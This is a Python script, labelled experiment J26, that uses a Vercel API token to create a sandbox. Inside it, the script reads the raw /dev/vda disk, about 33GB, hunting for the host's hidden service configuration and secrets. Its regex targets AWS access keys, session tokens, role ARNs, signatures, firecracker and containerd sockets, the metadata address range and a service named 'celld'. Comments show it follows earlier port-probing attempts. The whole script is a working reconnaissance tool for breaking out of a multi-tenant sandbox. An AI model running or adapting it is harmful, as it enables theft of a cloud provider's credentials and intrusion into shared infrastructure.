# 实验J26: vda 全盘 33GB 流式扫描 - 找 celld 配置/凭据/服务路径线索
# J23: vda 读速 843MB/s; J25: ::1 端口猜路径全 404 -> 从 vda 内容反推
# 目标: celld 配置/AWS 凭据/token/服务路径/二进制名
import json, base64, pathlib, time, urllib.request, urllib.error
import sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=400):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj26"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import re, time
# 精准特征: celld 配置/服务路径/凭据
PAT = re.compile(rb"(celld|xkernel|\bport\s*=\s*\d+|listen|\baddr\s*=|endpoint|api[_-]?url|base[_-]?url|role[_-]?arn|\bregion\s*=|bucket|access[_-]?key|secret[_-]?key|session[_-]?token|AKIA[0-9A-Z]{12}|ASIA[0-9A-Z]{12}|X-Signature|hvc_[0-9a-z]{8}|cell_id|23456|30001|30002|init\.sock|cell\.sock|apm\.sock|metrics\.sock|containerd\.sock|firecracker|microvm|169\.254|vercel-proxy-ca|/mnt/drives|/opt/vercel|\.toml|\.service|journald)", re.I)
hits = []
t0 = time.time()
CH = 64*1024*1024
total = 0
SKIP = 512*1024*1024
with open("/dev/vda", "rb") as f:
    f.seek(SKIP)
    while True:
        d = f.read(CH)
        if not d:
            break
        total += len(d)
        for mm in PAT.finditer(d):
            s = max(0, mm.start()-150); e = min(len(d), mm.end()+350)
            ctx = d[s:e]
            if any(ctx[:40] == h[:40] for h in hits):
                continue
            hits.append(ctx)
            if len(hits) >= 200:
                break
        if len(hits) >= 200:
            break
print("scan", round(total/1024/1024/1024,1), "GB in", round(time.time()-t0,1), "s, hits:", len(hits), flush=True)
for i, h in enumerate(hits):
    t = h.decode(errors="replace")
    t = re.sub(r"\s+", " ", t)
    print(f"[{i}] {t[:280]}", flush=True)
'''
run_cmd(sid, SCAN, "vda-fullscan", wait=True, timeout=280000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
